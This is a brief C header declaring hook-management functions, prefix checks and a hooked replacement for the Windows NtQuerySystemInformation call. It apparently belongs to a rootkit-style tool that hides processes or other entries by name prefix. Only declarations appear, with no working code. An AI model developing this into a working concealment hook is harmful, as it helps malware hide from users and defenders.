#pragma once

VOID InitHooks();

BOOL InstallHook();
BOOL UnHook();

BOOL HasPrefix(LPCWSTR str);
BOOL HasPrefixU(UNICODE_STRING str);



NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);